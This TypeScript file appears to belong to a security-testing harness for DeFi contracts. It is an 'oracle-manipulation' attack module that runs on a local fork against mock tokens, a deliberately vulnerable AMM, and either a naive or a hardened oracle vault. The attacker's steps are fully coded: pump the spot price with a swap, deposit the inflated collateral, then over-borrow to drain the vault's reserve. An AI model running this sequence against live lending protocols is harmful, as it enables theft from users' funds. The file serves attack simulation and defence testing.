import { parseEther, maxUint256 } from "viem";
import type { AttackModule, ModuleResult, RunOptions } from "../types";
import type { ForkRunner } from "../fork";
import { deploy, send, read, toUsd } from "../evm";

const M20 = "MockERC20.sol";
const M20N = "MockERC20";
const AMM = "VulnerableAMM.sol";
const AMMN = "VulnerableAMM";
const WAD = 10n ** 18n;

export const oracleModule: AttackModule = {
  name: "oracle-manipulation",
  async run(fork: ForkRunner, opts?: RunOptions): Promise<ModuleResult> {
    const hardened = opts?.hardened ?? false;
    const V = hardened ? "HardenedOracleVault.sol" : "NaiveOracleVault.sol";
    const VN = hardened ? "HardenedOracleVault" : "NaiveOracleVault";

    const deployer = fork.wallet(0);
    const atk = fork.wallet(1);
    const d = deployer.account.address;
    const a = atk.account.address;

    const tkn = await deploy(deployer, M20, M20N, ["TKN", "TKN"]);
    const usdc = await deploy(deployer, M20, M20N, ["USDC", "USDC"]);
    const amm = await deploy(deployer, AMM, AMMN, [tkn, usdc]);

    await send(deployer, tkn, M20, M20N, "mint", [d, parseEther("1000")]);
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("1000")]);
    await send(deployer, tkn, M20, M20N, "approve", [amm, maxUint256]);
    await send(deployer, usdc, M20, M20N, "approve", [amm, maxUint256]);
    await send(deployer, amm, AMM, AMMN, "addLiquidity", [parseEther("100"), parseEther("100")]);

    const vault = await deploy(deployer, V, VN, [usdc, tkn, amm]);
    await send(deployer, usdc, M20, M20N, "mint", [d, parseEther("100000")]);
    await send(deployer, usdc, M20, M20N, "approve", [vault, maxUint256]);
    await send(deployer, vault, V, VN, "supply", [parseEther("100000")]);

    await send(deployer, usdc, M20, M20N, "mint", [a, parseEther("10000")]);
    const before = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);

    try {
      await send(atk, usdc, M20, M20N, "approve", [amm, maxUint256]);
      await send(atk, amm, AMM, AMMN, "swap", [usdc, parseEther("900"), a]);

      const tknBal = await read<bigint>(fork, tkn, M20, M20N, "balanceOf", [a]);
      await send(atk, tkn, M20, M20N, "approve", [vault, maxUint256]);
      await send(atk, vault, V, VN, "deposit", [tknBal]);

      const price = await read<bigint>(fork, vault, V, VN, "price", []);
      const maxDebt = ((tknBal * price) / WAD) * 7000n / 10000n;
      const borrow = (maxDebt * 999n) / 1000n;
      await send(atk, vault, V, VN, "borrow", [borrow]);

      const after = await read<bigint>(fork, usdc, M20, M20N, "balanceOf", [a]);
      const profit = after > before ? after - before : 0n;
      return {
        name: "oracle-manipulation",
        success: profit > 0n,
        extractedUsd: toUsd(profit),
        note: "pumped spot price, over-borrowed against inflated collateral, drained the reserve"
      };
    } catch {
      return {
        name: "oracle-manipulation",
        success: false,
        extractedUsd: 0,
        note: "blocked by target protection"
      };
    }
  }
};
